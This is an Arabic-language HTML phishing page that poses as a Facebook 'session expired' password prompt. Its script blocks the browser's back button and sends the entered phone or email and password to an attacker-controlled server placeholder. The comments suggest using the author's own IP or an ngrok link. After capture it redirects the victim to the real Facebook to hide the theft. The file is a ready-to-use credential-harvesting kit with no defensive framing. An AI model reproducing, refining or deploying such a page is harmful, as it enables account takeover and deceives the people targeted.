<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Facebook Verification</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; }
        .header { background: #fff; padding: 20px; text-align: center; border-bottom: 1px solid #ddd; }
        .content { padding: 30px 20px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 28px; font-weight: bold; margin-bottom: 15px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; background: #f5f6f7; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; margin-top: 10px; }
        .error { color: #fa3e3e; font-size: 14px; margin-bottom: 10px; display: none; }
        .footer-text { font-size: 13px; color: #8a8d91; margin-top: 20px; }
    </style>
</head>
<body>

<div class="header">
    <div class="fb-logo">facebook</div>
</div>

<div class="content">
    <p><strong>جلسة تسجيل الدخول منتهية</strong></p>
    <p style="font-size: 14px; color: #606770;">يرجى إعادة إدخال كلمة السر لتأكيد ملكية الحساب ومتابعة النشاط.</p>
    
    <div id="error-box" class="error">كلمة السر التي أدخلتها غير صحيحة.</div>
    
    <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
    <input type="password" id="pass" placeholder="كلمة السر">
    
    <button onclick="sendPayload()">تسجيل الدخول</button>
    <p class="footer-text">هل نسيت كلمة السر؟</p>
</div>

<script>
    // تكتيك منع الرجوع (Looping the History)
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() {
        window.history.pushState(null, null, window.location.href);
    };

    async function sendPayload() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        const errorBox = document.getElementById('error-box');

        // استبدل SERVER_IP بـ IP جهازك الحقيقي أو رابط ngrok
        const SERVER_URL = "http://YOUR_SERVER_IP:3000/auth/login";

        try {
            const response = await fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user, pass })
            });

            const data = await response.json();

            if (data.status === "fail") {
                errorBox.style.display = 'block';
            } else {
                // إعادة توجيه لفيسبوك الحقيقي بعد النجاح
                window.location.href = "https://www.facebook.com";
            }
        } catch (e) {
            console.error("Connection Error");
        }
    }
</script>
</body>
</html>
